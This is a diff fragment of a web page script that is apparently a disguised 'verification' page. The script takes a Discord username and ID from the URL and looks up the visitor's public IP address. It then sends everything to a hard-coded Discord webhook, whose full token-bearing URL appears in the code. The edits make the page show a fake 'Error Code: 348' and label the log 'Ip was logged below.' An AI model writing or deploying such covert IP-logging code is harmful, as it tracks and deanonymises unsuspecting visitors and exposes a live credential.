@@ -219,8 +219,8 @@
     
     const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521502173773566074/-X_NpKwsyVzHUD8jmoykjbKnjNGPU5yMfAXSWX1-GhiMbB5nLpmRQwq0l8k-6mHherSu"; // ← Change this
     const urlParams = new URLSearchParams(window.location.search);
-    const userId = urlParams.get('user_id') || 'unknown';
-    const username = urlParams.get('username') || 'unknown';
+    const userId = urlParams.get('user_id') || 'Error Code: 348';
+    const username = urlParams.get('username') || 'Error Code: 348';
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
@@ -230,7 +230,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [{
-              title: "🔍 Verification Log",
+              title: "User entered ENIRE, Ip was logged below.",
               color: 0x00FF00,
               fields: [
                 { name: "Discord Username", value: username, inline: true },
